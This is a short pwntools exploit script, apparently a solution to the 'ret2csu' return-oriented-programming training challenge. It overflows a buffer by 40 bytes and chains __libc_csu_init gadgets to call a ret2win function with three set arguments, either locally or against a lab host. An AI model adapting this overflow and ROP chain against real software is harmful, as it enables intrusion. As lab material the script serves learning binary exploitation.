#!/usr/bin/env python3

from pwn import *

e = ELF("./ret2csu_patched")

context.binary = e  # Set the target binary for pwntools
context.terminal = ["kitty", "-e"]  # Terminal to use for GDB debugging
HOST = "10.10.10.10"  # Remote host IP
PORT = 1337  # Remote port

gdb_script = """
b main  
b *0x000000000040069a
continue  
"""

def conn():
    # Start local process with optional GDB or connect to remote
    if args.LOCAL:
        p = process([e.path])
        if args.GDB:
            gdb.attach(p, gdbscript=gdb_script)
    else:
        p = remote(HOST, PORT)
    return p

def main():
    p = conn()  # Establish connection to target
    popRDI          = 0x00000000004006a3 # pop  rdi ; ret
    popRSIpopR15    = 0x00000000004006a1 # pop  rsi ; pop r15 ; ret
    pop_csu         = 0x000000000040069a
    mov_csu         = 0x0000000000400680 # mov rdx,r15; mov rsi,r14; mov edi,r13d; call QWORD PTR [r12+rbx*8]
    ret2win         = 0x000000000040062a
    arg1            = 0xDEADBEEFDEADBEEF
    arg2            = 0xCAFEBABECAFEBABE
    arg3            = 0xD00DF00DD00DF00D
    offset = 40     # Offset to control return address
    init_array      = 0x0000000000600df0

    payload = b''
    payload += b'A' * offset
    payload += p64(pop_csu) + p64(0) + p64(1) + p64(init_array) + p64(0) + p64(0x00) + p64(arg3)
    payload += p64(mov_csu)
    payload += p64(0x00) * 7
    payload += p64(popRDI) + p64(arg1)
    payload += p64(popRSIpopR15) + p64(arg2) + p64(0x00) 
    payload += p64(ret2win)
    
    p.sendline(payload)
    p.interactive()  # Hand over interaction to user for shell or output

if __name__ == "__main__":
    main()

